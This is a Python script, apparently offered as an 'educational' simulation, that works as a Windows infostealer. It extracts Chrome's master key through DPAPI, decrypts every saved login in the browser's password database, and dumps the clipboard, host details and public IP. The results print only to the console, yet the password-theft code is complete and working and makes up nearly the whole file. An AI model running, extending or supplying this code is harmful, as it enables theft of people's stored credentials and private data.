import os
import json
import base64
import shutil
import sqlite3
import pyperclip
import platform
import socket
import uuid
import re
import requests

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


def get_decryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # remove DPAPI prefix
    key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key


def decrypt_password(encrypted_password, key):
    try:
        # Chrome AES-GCM encrypted passwords (v10 or v11)
        if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
            iv = encrypted_password[3:15]               # 12-byte IV
            ciphertext = encrypted_password[15:-16]     # Encrypted data
            tag = encrypted_password[-16:]              # Authentication tag

            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode("utf-8")
        
        # Legacy DPAPI encrypted passwords
        else:
            return CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8")
    
    except Exception as e:
        return f"[Failed to decrypt] {e}"


def extract_browser_passwords():
    print("\n--- Saved Browser Passwords (Chrome) ---")
    key = get_decryption_key()
    login_db_path = os.path.join(os.environ["USERPROFILE"],
                                 "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")

    # Copy database to avoid locking issues
    temp_db = "LoginData_temp.db"
    shutil.copy2(login_db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, password in cursor.fetchall():
            decrypted_pass = decrypt_password(password, key)
            print(f"URL: {url} | Username: {username} | Password: {decrypted_pass}")
    except Exception as e:
        print(f"Error reading DB: {e}")
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_db)


def capture_clipboard():
    print("\n--- Clipboard Content ---")
    try:
        content = pyperclip.paste()
        if content:
            print(f"Clipboard: {content}")
        else:
            print("Clipboard is empty.")
    except Exception as e:
        print(f"Clipboard Error: {e}")


def steal_system_info():
    print("\n--- System Information ---")
    try:
        info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Architecture": platform.machine(),
            "Hostname": socket.gethostname(),
            "Local IP": socket.gethostbyname(socket.gethostname()),
            "MAC": ":".join(re.findall("..", "%012x" % uuid.getnode()))
        }
        try:
            response = requests.get("https://api.ipify.org?format=json", timeout=5)
            info["Public IP"] = response.json().get("ip", "N/A")
        except Exception as e:
            info["Public IP"] = f"Failed: {e}"

        for key, value in info.items():
            print(f"{key}: {value}")
    except Exception as e:
        print(f"System Info Error: {e}")


if __name__ == "__main__":
    print("=== Educational Info Stealer Simulation ===")
    extract_browser_passwords()
    capture_clipboard()
    steal_system_info()
